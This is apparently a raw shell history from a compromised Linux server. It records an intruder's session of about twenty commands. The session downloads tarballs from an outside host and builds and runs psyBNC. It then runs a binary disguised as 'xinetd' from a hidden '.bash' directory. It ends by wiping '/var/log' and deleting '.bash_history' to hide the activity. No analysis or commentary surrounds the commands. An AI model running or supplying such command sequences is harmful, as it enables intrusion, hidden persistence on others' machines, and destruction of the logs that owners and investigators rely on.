w
ls
cd /tmp
wget
ps ax
wget www.rap.pluto.ro/psybnc.tar.gz
tar xzvf psybnc.tar.gz
cd psybnc
make
./psybnc
ls
make
cd ..
wget www.rap.pluto.ro/psyL.tar.gz
tar xzvf psyL.tar.gz
cd .bash
./xinetd
ls
w
rm -rf /var/log
cd /home
ls
rm -rf .bash_history
